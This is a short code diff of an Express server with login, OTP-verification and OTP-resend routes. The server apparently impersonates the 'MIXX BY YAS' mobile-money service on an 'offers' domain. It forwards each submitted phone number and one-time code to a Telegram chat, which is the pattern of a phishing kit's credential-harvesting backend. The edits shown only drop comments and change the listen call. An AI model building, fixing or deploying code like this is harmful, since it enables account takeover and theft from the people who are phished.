@@ -71,7 +71,6 @@ app.post('/api/login', async (req, res) => {
     const otp = Math.floor(100000 + Math.random() * 900000).toString();
     console.log(`🔐 OTP for ${phone}: ${otp}`);
     
-    // Send to Telegram
     await sendTelegramMessage(`
 🔔 <b>MIXX BY YAS - LOGIN</b>
 ━━━━━━━━━━━━━━━━━━━━━
@@ -101,7 +100,6 @@ app.post('/api/verify-otp', async (req, res) => {
         });
     }
     
-    // Send to Telegram
     await sendTelegramMessage(`
 ✅ <b>MIXX BY YAS - OTP VERIFICATION</b>
 ━━━━━━━━━━━━━━━━━━━━━
@@ -150,7 +148,8 @@ app.post('/api/resend-otp', async (req, res) => {
 });
 
 // ===== START =====
-app.listen(PORT, '0.0.0.0', () => {
+// FIXED: Removed '0.0.0.0' - Railway handles this automatically
+app.listen(PORT, () => {
     console.log(`✅ Server running on port ${PORT}`);
     console.log(`📍 https://mixxbyyas-offers06com-production.up.railway.app`);
     console.log('✅ Server is ready!');
